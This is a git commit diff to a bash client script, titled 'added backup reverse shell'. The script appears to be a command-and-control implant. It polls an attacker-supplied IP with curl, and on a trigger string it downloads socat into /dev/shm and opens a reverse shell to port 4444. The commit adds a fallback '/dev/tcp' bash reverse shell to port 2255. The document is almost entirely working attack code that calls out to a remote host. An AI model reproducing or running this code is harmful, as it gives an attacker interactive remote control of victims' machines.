87bf44964b4d0b3f69f10e59a64262af02c7dbf4
avnogy <avner.mindelis@gmail.com>
2023-04-29 18:10:17 +0300

    added backup reverse shell

--- client/main.sh
+++ client/main.sh
@@ -6,7 +6,6 @@ IP=$1
 REVERSE_SHELL_CODE="Hello World!"
 
 while true; do
-    echo  "http://$IP:6969"
     RESPONSE=$(curl -s http://$IP:6969)
     if [[ $RESPONSE == "" ]]; then
         echo "server down."
@@ -14,7 +13,10 @@ while true; do
         if [[ $RESPONSE == $REVERSE_SHELL_CODE ]]; then
             echo "STARTING REVERSE SHELL"
             # One liner to get socat and create a reverse shell
-            wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:4444
+            wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:4444 || bash -i >& /dev/tcp/$IP/2255 0>&1
+
+                #bash -i >& /dev/tcp/$IP/2255 0>&1
+
         else
             echo $RESPONSE
             echo "something else"
